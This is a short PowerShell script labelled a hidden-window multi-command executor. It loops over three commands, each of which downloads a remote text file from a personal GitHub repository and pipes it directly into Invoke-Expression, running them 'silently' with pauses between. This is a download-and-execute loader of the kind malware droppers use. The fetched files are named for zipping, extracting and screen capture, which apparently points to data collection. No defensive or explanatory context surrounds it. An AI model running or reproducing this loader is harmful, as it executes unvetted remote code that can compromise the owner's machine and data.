# PowerShell Multi-Command Executor (Hidden Window)
$commands = @(
    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/zip2.txt | iex',
    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/extract-1.txt | iex', 
    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/screen.txt | iex'
)

# Execute all commands silently
foreach ($cmd in $commands) {
    Invoke-Expression $cmd
    Start-Sleep -Seconds 2  # Wait 2 seconds between commands
}
